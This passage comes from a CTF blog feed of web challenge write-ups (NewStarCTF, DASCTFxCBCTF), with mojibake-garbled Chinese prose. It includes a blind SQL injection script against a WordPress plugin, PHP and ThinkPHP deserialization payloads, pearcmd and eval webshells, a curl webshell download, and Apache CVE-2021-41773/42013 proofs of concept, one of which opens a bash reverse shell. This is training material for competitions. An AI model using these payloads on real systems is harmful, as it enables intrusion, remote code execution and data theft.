src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221031213354058.png" alt="image-20221031213354058"></p><p>å…¶ä¸­ simple-link-directory, å­˜åœ¨ sql æ³¨å…¥</p><p><a href="https://wpscan.com/vulnerability/1c83ed73-ef02-45c0-a9ab-68a3468d2210">https://wpscan.com/vulnerability/1c83ed73-ef02-45c0-a9ab-68a3468d2210</a></p><p>payload</p><pre class="language-txt" data-language="txt"><code class="language-txt">curl &#39;http:&#x2F;&#x2F;example.com&#x2F;wp-admin&#x2F;admin-ajax.php&#39; --data &#39;action&#x3D;qcopd_upvote_action&amp;post_id&#x3D;(SELECT 3 FROM (SELECT SLEEP(5))enz)&#39; </code></pre><p>åè¾¹å°±æ˜¯sqlæ—¶é—´ç›²æ³¨äº†</p><p>æŠ„äº†ä¸ªè„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport timeurl &#x3D; &#39;http:&#x2F;&#x2F;1.14.71.254:28504&#x2F;wp-admin&#x2F;admin-ajax.php&#39;dicts &#x3D; r&#39;NSSCTF&#123;-abcdef0123456789&#125;&#39;flag &#x3D; &#39;&#39;for i in range(1,99999):    for s in dicts:        payload &#x3D; &quot;(SELECT 3 FROM (SELECT if(ascii(substr((select group_concat(flag) from ctftraining.flag),&#123;&#125;,1))&#x3D;&#123;&#125;, sleep(5),0))enz)&quot;.format(i,ord(s))        start_time &#x3D; time.time()        print(s)        res &#x3D; requests.post(url,data&#x3D;&#123;            &#39;action&#39;: &#39;qcopd_upvote_action&#39;,            &#39;post_id&#39;: payload            &#125;)        stop_time &#x3D; time.time()        if stop_time - start_time &gt;&#x3D; 5:            flag +&#x3D; s            print(&#39;FOUND!!!&#39;,flag)            break</code></pre><h2 id="WEEK3-Fun-php"><a href="#WEEK3-Fun-php" class="headerlink" title="[WEEK3]Fun_php"></a>[WEEK3]Fun_php</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF</title>
      <link href="/2022/09/25/NewStarCTF/"/>
      <url>/2022/09/25/NewStarCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h2><p>ç¬¬ä¸€å‘¨webå¤ªç®€å•ä¸æƒ³å†™</p><h2 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h2><h3 id="IncludeOne"><a href="#IncludeOne" class="headerlink" title="IncludeOne"></a>IncludeOne</h3><pre class="language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;seed.php&quot;);&#x2F;&#x2F;mt_srand(*********);echo &quot;Hint: &quot;.mt_rand().&quot;&lt;br&gt;&quot;;if(isset($_POST[&#39;guess&#39;]) &amp;&amp; md5($_POST[&#39;guess&#39;]) &#x3D;&#x3D;&#x3D; md5(mt_rand()))&#123;    if(!preg_match(&quot;&#x2F;base|\.\.&#x2F;i&quot;,$_GET[&#39;file&#39;]) &amp;&amp; preg_match(&quot;&#x2F;NewStar&#x2F;i&quot;,$_GET[&#39;file&#39;]) &amp;&amp; isset($_GET[&#39;file&#39;]))&#123;        &#x2F;&#x2F;flag in &#96;flag.php&#96;        include($_GET[&#39;file&#39;]);    &#125;else&#123;        echo &quot;Baby Hacker?&quot;;    &#125;&#125;else&#123;    echo &quot;No Hacker!&quot;;&#125; </code></pre><p>å…ˆæ˜¯ä¸ªä¼ªéšæœºï¼Œç„¶åç»•è¿‡ifåˆ¤æ–­</p><p>ä¼ªéšæœºå°±ç›´æ¥çˆ†ç§å­ç„¶åæŒ¨ä¸ªè¯•å°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220925223642254.png" alt="image-20220925223642254"></p><p>ç„¶åæ˜¯ç»•è¿‡ifï¼Œä¸è®©æœ‰baseï¼Œè¿˜è¦æœ‰newstarï¼Œç”¨ä¼ªåè®®å°±è¡Œã€‚</p><p>PHPä¼ªåè®®å¯ä»¥å°†æŸä¸ªæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹åŒ…å«åœ¨å…¶ä¸­</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220925223827996.png" alt="image-20220925223827996"></p><p>f12çœ‹è§flag.phpçš„å†…å®¹ï¼Œç„¶årot13è§£ç ã€‚</p><h3 id="UnserializeOne"><a href="#UnserializeOne" class="headerlink" title="UnserializeOne"></a>UnserializeOne</h3><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass Start&#123;    public $name;    public $func;    public function __destruct()    &#123;        echo &quot;Welcome to NewStarCTF, &quot;.$this-&gt;name;    &#125;    public function __isset($var)    &#123;        ($this-&gt;func)();    &#125;&#125;class Sec&#123;    private $obj;    private $var;    public function __toString()    &#123;        $this-&gt;obj-&gt;check($this-&gt;var);        return &quot;CTFers&quot;;    &#125;    public function __invoke()    &#123;        echo file_get_contents(&#39;&#x2F;flag&#39;);    &#125;&#125;class Easy&#123;    public $cla;    public function __call($fun, $var)    &#123;        $this-&gt;cla &#x3D; clone $var[0];    &#125;&#125;class eeee&#123;    public $obj;    public function __clone()    &#123;        if(isset($this-&gt;obj-&gt;cmd))&#123;            echo &quot;success&quot;;        &#125;&#125;&#125;$a &#x3D; new Start();$a -&gt;name &#x3D; new Sec();$a -&gt;name-&gt;obj &#x3D; new Easy();$a -&gt;name-&gt;var &#x3D; new eeee();$a -&gt;name-&gt;var-&gt;obj &#x3D; new Start();$a -&gt;name-&gt;var-&gt;obj-&gt;func &#x3D; new Sec();#payload#O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;O:4:&quot;Easy&quot;:1:&#123;s:3:&quot;cla&quot;;N;&#125;s:3:&quot;var&quot;;O:4:&quot;eeee&quot;:1:&#123;s:3:&quot;obj&quot;;O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;N;s:4:&quot;func&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;N;s:3:&quot;var&quot;;N;&#125;&#125;&#125;&#125;s:4:&quot;func&quot;;N;&#125;</code></pre><p>å¯ä»¥åˆ©ç”¨å¯¹äºPHPç‰ˆæœ¬7.1+ï¼Œå¯¹å±æ€§çš„ç±»å‹ä¸æ•æ„Ÿï¼Œæˆ‘ä»¬å¯ä»¥å°†protectedç±»å‹æ”¹ä¸ºpublicï¼Œä»¥æ¶ˆé™¤ä¸å¯æ‰“å°å­—ç¬¦ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220925231137367.png" alt="image-20220925231137367"></p><h3 id="Word-For-You-2-Gen"><a href="#Word-For-You-2-Gen" class="headerlink" title="Word-For-You(2 Gen)"></a>Word-For-You(2 Gen)</h3><p>æŠ¥é”™æ³¨å…¥å°±è¡Œ</p><p>flagåœ¨wfy_commentè¡¨çš„id=100é‚£è¡Œ</p><h3 id="ezAPI"><a href="#ezAPI" class="headerlink" title="ezAPI"></a>ezAPI</h3><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);$id &#x3D; $_POST[&#39;id&#39;];function waf($str)&#123;    if (!is_numeric($str) || preg_replace(&quot;&#x2F;[0-9]&#x2F;&quot;, &quot;&quot;, $str) !&#x3D;&#x3D; &quot;&quot;) &#123;        return False;    &#125; else &#123;        return True;    &#125;&#125;function send($data)&#123;    $options &#x3D; array(        &#39;http&#39; &#x3D;&gt; array(            &#39;method&#39; &#x3D;&gt; &#39;POST&#39;,            &#39;header&#39; &#x3D;&gt; &#39;Content-type: application&#x2F;json&#39;,            &#39;content&#39; &#x3D;&gt; $data,            &#39;timeout&#39; &#x3D;&gt; 10 * 60        )    );    $context &#x3D; stream_context_create($options);    $result &#x3D; file_get_contents(&quot;http:&#x2F;&#x2F;graphql:8080&#x2F;v1&#x2F;graphql&quot;, false, $context);    return $result;&#125;if (isset($id)) &#123;    if (waf($id)) &#123;        isset($_POST[&#39;data&#39;]) ? $data &#x3D; $_POST[&#39;data&#39;] : $data &#x3D; &#39;&#123;&quot;query&quot;:&quot;query&#123;\nusers_user_by_pk(id:&#39; . $id . &#39;) &#123;\nname\n&#125;\n&#125;\n&quot;, &quot;variables&quot;:null&#125;&#39;;        $res &#x3D; json_decode(send($data));        if ($res-&gt;data-&gt;users_user_by_pk-&gt;name !&#x3D;&#x3D; NULL) &#123;            echo &quot;ID: &quot; . $id . &quot;&lt;br&gt;Name: &quot; . $res-&gt;data-&gt;users_user_by_pk-&gt;name;        &#125; else &#123;            echo &quot;&lt;b&gt;Can&#39;t found it!&lt;&#x2F;b&gt;&lt;br&gt;&lt;br&gt;DEBUG: &quot;;            var_dump($res-&gt;data);        &#125;    &#125; else &#123;        die(&quot;&lt;b&gt;Hacker! Only Number!&lt;&#x2F;b&gt;&quot;);    &#125;&#125; else &#123;    die(&quot;&lt;b&gt;No Data?&lt;&#x2F;b&gt;&quot;);&#125;?&gt;</code></pre><p>æœ¬æ¥ä»¥ä¸ºä¼šæ˜¯ä¸€ä¸ªstream_context_createçš„crlfæ¼æ´ï¼Œç„¶åå‘ç°å…¶å®æ˜¯graphqlçš„å®‰å…¨é—®é¢˜</p><p><a href="https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ">ç©è½¬graphQL (qq.com)</a></p><p>å…·ä½“çš„çœ‹è¿™ä¸ªå°±è¡Œ</p><p>å…ˆç”¨å†…çœæŸ¥è¯¢è·å¾—æ•°æ®</p><pre class="language-txt" data-language="txt"><code class="language-txt">&#123;&quot;query&quot;:&quot;\n    query IntrospectionQuery &#123;\r\n      __schema &#123;\r\n        queryType &#123; name &#125;\r\n        mutationType &#123; name &#125;\r\n        subscriptionType &#123; name &#125;\r\n        types &#123;\r\n          ...FullType\r\n        &#125;\r\n        directives &#123;\r\n          name\r\n          description\r\n          locations\r\n          args &#123;\r\n            ...InputValue\r\n          &#125;\r\n        &#125;\r\n      &#125;\r\n    &#125;\r\n\r\n    fragment FullType on __Type &#123;\r\n      kind\r\n      name\r\n      description\r\n      fields(includeDeprecated: true) &#123;\r\n        name\r\n        description\r\n        args &#123;\r\n          ...InputValue\r\n        &#125;\r\n        type &#123;\r\n          ...TypeRef\r\n        &#125;\r\n        isDeprecated\r\n        deprecationReason\r\n      &#125;\r\n      inputFields &#123;\r\n        ...InputValue\r\n      &#125;\r\n      interfaces &#123;\r\n        ...TypeRef\r\n      &#125;\r\n      enumValues(includeDeprecated: true) &#123;\r\n        name\r\n        description\r\n        isDeprecated\r\n        deprecationReason\r\n      &#125;\r\n      possibleTypes &#123;\r\n        ...TypeRef\r\n      &#125;\r\n    &#125;\r\n\r\n    fragment InputValue on __InputValue &#123;\r\n      name\r\n      description\r\n      type &#123; ...TypeRef &#125;\r\n      defaultValue\r\n    &#125;\r\n\r\n    fragment TypeRef on __Type &#123;\r\n      kind\r\n      name\r\n      ofType &#123;\r\n        kind\r\n        name\r\n        ofType &#123;\r\n          kind\r\n          name\r\n          ofType &#123;\r\n            kind\r\n            name\r\n            ofType &#123;\r\n              kind\r\n              name\r\n              ofType &#123;\r\n                kind\r\n                name\r\n                ofType &#123;\r\n                  kind\r\n                  name\r\n                  ofType &#123;\r\n                    kind\r\n                    name\r\n                  &#125;\r\n                &#125;\r\n              &#125;\r\n            &#125;\r\n          &#125;\r\n        &#125;\r\n      &#125;\r\n    &#125;\r\n  &quot;,&quot;variables&quot;:null&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220927144312348.png" alt="image-20220927144312348"></p><p>æ‰¾åˆ°flagåœ¨çš„åœ°æ–¹ï¼Œç„¶åæŸ¥è¯¢</p><p><code>&amp;data=&#123;&quot;query&quot;:&quot;query&#123;\nffffllllaaagggg_1n_h3r3_flag &#123;\nflag\n&#125;\n&#125;\n&quot;, &quot;variables&quot;:null&#125;</code></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220927142726823.png" alt="image-20220927142726823"></p><h2 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h2><h3 id="BabySSTI-One"><a href="#BabySSTI-One" class="headerlink" title="BabySSTI_One"></a>BabySSTI_One</h3><p>ç›´æ¥ç”¨ä¹‹å‰çè—çš„é‚£ä¸ªssti payloadå¾€é‡Œå†™é©¬</p><h3 id="multiSQL"><a href="#multiSQL" class="headerlink" title="multiSQL"></a>multiSQL</h3><p>1&#39;;show tables;#</p><p>1&#39;;show columns from score;#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221003220711088.png" alt="image-20221003220711088"></p><p>æ”¹æˆç»©</p><p>1&#39;;SET @sqli=concat(char(117,112,100,97,116,101),&#39; <code>score</code> SET  listen= 221&#39;);PREPARE hacker from @sqli;EXECUTE hacker;#</p><p>1&#39;;SET @sqli=concat(char(115,101,108,101,99,116),&#39;* from score&#39;);PREPARE hacker from @sqli;EXECUTE hacker;#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221003222246387.png" alt="image-20221003222246387"></p><p>éªŒè¯</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221003222306150.png" alt="image-20221003222306150"></p><h3 id="IncludeTwo"><a href="#IncludeTwo" class="headerlink" title="IncludeTwo"></a>IncludeTwo</h3><p>pearæ–‡ä»¶åŒ…å«rce</p><pre class="language-none"><code class="language-none">?file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd&amp;+config-create+&#x2F;&lt;?&#x3D;eval($_POST[a]);?&gt;+&#x2F;tmp&#x2F;hello.php</code></pre><p>ç„¶ååŒ…å«hello.php</p><p>TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NDp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJ3aG9hbWkiO31zOjIxOiIAdGhpbmtcTW9kZWwAd2l0aEF0dHIiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJzeXN0ZW0iO31zOjk6IgAqAGFwcGVuZCI7YToxOntzOjU6InNvNG1zIjthOjA6e319czo4OiJyZWxhdGlvbiI7YjowO319fQ</p><h3 id="Maybe-You-Have-To-think-More"><a href="#Maybe-You-Have-To-think-More" class="headerlink" title="Maybe You Have To think More"></a>Maybe You Have To think More</h3><p>å¥½æ€ªçš„é¢˜ç›®ï¼Œä¸ç»™æºç çš„ååºåˆ—åŒ–å¯è¿˜è¡Œ</p><p>cookieé‡Œæ˜¯åºåˆ—åŒ–çš„å†…å®¹ï¼Œç„¶åé€šè¿‡æŠ¥é”™å¯ä»¥å¾—åˆ°æ˜¯tp5.1.41çš„ç‰ˆæœ¬ã€‚ç›´æ¥å»ç½‘ä¸Šæ‰¾ç°æˆçš„ååºåˆ—åŒ–é“¾å­ã€‚</p><p>æ­£å¥½æœ‰ä¸ªå¯¹åº”ç‰ˆæœ¬çš„ååºåˆ—åŒ–é“¾ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥æ‹¿åˆ°çš„payloadæ²¡æ³•ç”¨ï¼Œå¯èƒ½æ˜¯æºç ä¸å¤ªä¸€æ ·</p><p><a href="https://www.freebuf.com/vuls/269882.html">https://www.freebuf.com/vuls/269882.html</a></p><p>è¿™é‡Œæˆ‘ä»¬ç”¨è¿™ä¸ª</p><p><a href="https://blog.csdn.net/weixin_54902210/article/details/124874209">ThinkPHP5.1ååºåˆ—åŒ–æ¼æ´_Sentiment.çš„åšå®¢-CSDNåšå®¢_thinkphp5.1æ¼æ´</a></p><p><a href="https://www.freebuf.com/vuls/263977.html">https://www.freebuf.com/vuls/263977.html</a></p><p>ä¸æ–‡ç« é‡Œå”¯ä¸€çš„ä¸åŒå°±æ˜¯è¦æŠŠåºåˆ—åŒ–çš„å†…å®¹æ”¾äº†cookieé‡Œã€‚</p><p>ç„¶ååœ¨ç¯å¢ƒå˜é‡é‡Œå¯ä»¥æ‰¾åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221004150141562.png" alt="image-20221004150141562"></p><h2 id="WEEK4"><a href="#WEEK4" class="headerlink" title="WEEK4"></a>WEEK4</h2><h3 id="So-Baby-RCE"><a href="#So-Baby-RCE" class="headerlink" title="So Baby RCE"></a>So Baby RCE</h3><p>ä¸¤ç§æ–¹æ³•ï¼š</p><p>ä¸€ç§æ˜¯ç”¨&amp;&amp;æ¥è¿æ¥å‘½ä»¤ï¼Œä½¿ç”¨cdæ¥ç©¿è¶Šç›®å½•ï¼Œç„¶åç”¨sortæ¥è¯»å–</p><p>cmd=cd%09..%26%26cd%09..%26%26cd%09..%26%26sort%09ffff?lllaaaaggggg </p><p>å¦ä¸€ç§æ˜¯curlç§é©¬</p><p>cmd=curl%09-o%091.php%09ip</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020143124846.png" alt="image-20221020143124846"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020143202810.png" alt="image-20221020143202810"></p><h2 id="WEEK5"><a href="#WEEK5" class="headerlink" title="WEEK5"></a>WEEK5</h2><h3 id="Unsafe-Apache"><a href="#Unsafe-Apache" class="headerlink" title="Unsafe Apache"></a>Unsafe Apache</h3><pre class="language-none"><code class="language-none">CVE-2021-41773</code></pre><p>å½±å“ç‰ˆæœ¬ï¼š<code>Apache 2.4.49</code></p><p>poc:</p><pre class="language-none"><code class="language-none">curl -v --path-as-is http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;icons&#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;etc&#x2F;passwdcurl -v --data &quot;echo;id&quot; &#39;http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;cgi-bin&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;bin&#x2F;sh&#39;curl -s --path-as-is -d &#39;echo Content-Type: text&#x2F;plain; echo; bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.190.146&#x2F;8888 0&gt;&amp;1&#39; &quot;http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;cgi-bin&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;bin&#x2F;sh&quot;url perlå¤åˆ¶ä»£ç CVE-2021-42013</code></pre><p>å½±å“ç‰ˆæœ¬ï¼š<code>Apache 2.4.49 å’Œ Apache 2.4.50</code></p><p>poc:</p><pre class="language-none"><code class="language-none">curl -v --path-as-is http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;icons&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;etc&#x2F;passwdcurl -v --data &quot;echo;id&quot; &#39;http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;cgi-bin&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;bin&#x2F;sh&#39;curl -s --path-as-is -d &#39;echo Content-Type: text&#x2F;plain; echo; whoami&#39; &quot;http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;cgi-bin&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;bin&#x2F;sh&quot;</code></pre><p>ä»å“åº”å¯ä»¥çœ‹åˆ°æ˜¯apache2.4.50ç‰ˆæœ¬</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020132536774.png" alt="image-20221020132536774"></p><p>å¦‚æœæœåŠ¡ç«¯å¼€å¯äº†cgiæˆ–cgidè¿™ä¸¤ä¸ªmodçš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªè·¯å¾„ç©¿è¶Šæ¼æ´å°†å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤</p><p>ç›´æ¥æ„é€ payloadè¿›è¡Œrce</p><pre class="language-txt" data-language="txt"><code class="language-txt">&#x2F;cgi-bin&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;bin&#x2F;sh</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020132755497.png" alt="image-20221020132755497"></p><h3 id="So-Baby-RCE-Again"><a href="#So-Baby-RCE-Again" class="headerlink" title="So Baby RCE Again"></a>So Baby RCE Again</h3><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);if(isset($_GET[&quot;cmd&quot;]))&#123;    if(preg_match(&#39;&#x2F;bash|curl&#x2F;i&#39;,$_GET[&quot;cmd&quot;]))&#123;        echo &quot;Hacker!&quot;;    &#125;else&#123;        shell_exec($_GET[&quot;cmd&quot;]);    &#125;&#125;else&#123;    show_source(__FILE__);&#125;</code></pre><p>å¯ä»¥ç›´æ¥å†™æ–‡ä»¶ï¼Œè®°å¾—è½¬ä¹‰$å·</p><pre class="language-txt" data-language="txt"><code class="language-txt">?cmd&#x3D;echo &quot;&lt;?php eval(\$_POST[1]);phpinfo();?&gt;&quot; &gt; 1.php</code></pre><p>å¯ä»¥çœ‹åˆ°æ ¹ç›®å½•ä¸‹æœ‰flagæ–‡ä»¶ï¼Œä½†æ˜¯å› ä¸ºæ˜¯700çš„æƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ææƒ</p><p>è¿™é‡Œæ˜¯åˆ©ç”¨çš„suidææƒ</p><p>find / -user root -perm -4000 -print 2&gt;/dev/null</p><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆåœ¨èšå‰‘çš„è™šæ‹Ÿç»ˆç«¯é‡Œæ²¡æ˜¾ç¤º</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020140222567.png" alt="image-20221020140222567"></p><p>çœ‹åˆ°æœ‰dateï¼Œå°±å¯ä»¥åˆ©ç”¨dateå‘½ä»¤è¯»å–flagæ–‡ä»¶</p><p>è¿™é‡Œåœ¨ç½‘é¡µä¸ä¼šæœ‰å›æ˜¾ï¼Œå¯èƒ½æ˜¯å› ä¸ºdateæ˜¯é€šè¿‡æŠ¥é”™æŠŠæ–‡ä»¶è¯»å‡ºæ¥çš„ï¼Œä½†æ˜¯ç½‘é¡µæ²¡æœ‰å›æ˜¾Linuxé‡Œçš„æŠ¥é”™ã€‚(çŒœçš„ï¼Œæ²¡éªŒè¯è¿‡</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020140729163.png" alt="image-20221020140729163"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTFxCBCTF</title>
      <link href="/2022/09/20/DASCTFxCBCTF/"/>
      <url>/2022/09/20/DASCTFxCBCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="dino3d"><a href="#dino3d" class="headerlink" title="dino3d"></a>dino3d</h2><p>è¿›å…¥åæ˜¯ä¸€ä¸ª3dç‰ˆçš„æ¸¸æˆï¼Œæ­»äº¡åä¼šæç¤ºè¯´ç©å¤Ÿä¸€ç™¾ä¸‡åˆ†å°±èƒ½æ‹¿åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920164212534.png" alt="QQæˆªå›¾20220920165732"></p><p>å…ˆæ¥ä¸ªéé¢„æœŸ</p><p>æˆ‘ä»¬åœ¨æ§åˆ¶å°å¯ä»¥çœ‹åˆ°scoreçš„å±æ€§</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920175500274.png" alt="image-20220920175500274"></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹score.scoreçš„æ–¹å¼æ¥ä¿®æ”¹æˆ‘ä»¬çš„åˆ†æ•°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920175655019.png" alt="image-20220920175655019"></p><p>ç„¶åæ˜¯é¢„æœŸè§£</p><p>åœ¨jsçš„æºç é‡Œå¯ä»¥çœ‹åˆ°æœ€åæœ‰è¿™ä¹ˆä¸€éƒ¨åˆ†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920175915900.png" alt="image-20220920175915900"></p><pre class="language-js" data-language="js"><code class="language-js"><span class="token function">sn</span><span class="token punctuation">(</span><span class="token parameter">e<span class="token punctuation">,</span> t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    e <span class="token operator">&amp;&amp;</span> t <span class="token operator">&amp;&amp;</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"/check.php"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        method<span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>        headers<span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token string">"Content-type"</span><span class="token operator">:</span> <span class="token string">"application/x-www-form-urlencoded; charset=UTF-8"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        body<span class="token operator">:</span> <span class="token string">"score="</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&amp;checkCode="</span> <span class="token operator">+</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> t<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&amp;tm="</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">+</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token operator">=></span>e<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token operator">=></span><span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><p>eå’Œtåˆ†åˆ«ä¸ºåˆ†æ•°å’ŒcheckCode</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920180224487.png" alt="image-20220920180224487"></p><p>checkCodeç”±ä¸¤éƒ¨åˆ†ç»„æˆ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920180251683.png" alt="image-20220920180251683"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920180305217.png" alt="image-20220920180305217"></p><p>æ‰€ä»¥t=checkCode=DASxCBCTF_wElc03e</p><p>ä¹Ÿå°±æ˜¯å‘check.phpå‘é€postè¯·æ±‚ï¼Œå…¶ä¸­æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œscoreã€checkCodeã€tmï¼Œscoreæ˜¯æˆ‘ä»¬çš„åˆ†æ•°ã€‚æˆ‘ä»¬å¯ä»¥è®¾æˆ1000000ï¼Œè¿™é‡Œçš„checkCodeæ˜¯md5(score.score+checkCode)ï¼ŒåŠmd5(1000000DASxCBCTF_wElc03e),tmå°±æ˜¯ä¸ªæ—¶é—´æˆ³</p><p>æ‰€ä»¥å¯ä»¥ç¼–å†™è„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport timeurl &#x3D; &#39;http:&#x2F;&#x2F;node4.buuoj.cn:27211&#x2F;check.php&#39;headers &#x3D; &#123;              &quot;Content-type&quot;: &quot;application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8&quot;          &#125;data &#x3D; &#123;    &quot;score&quot;: &quot;1000000&quot;,    &quot;checkCode&quot;: &#39;4639d0ab43e9030749f450eb6e9fbb97&#39;,    &quot;tm&quot;: str(time.time())[:10]&#125;rep &#x3D; requests.post(url, data&#x3D;data, headers&#x3D;headers).textprint(rep)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920181636482.png" 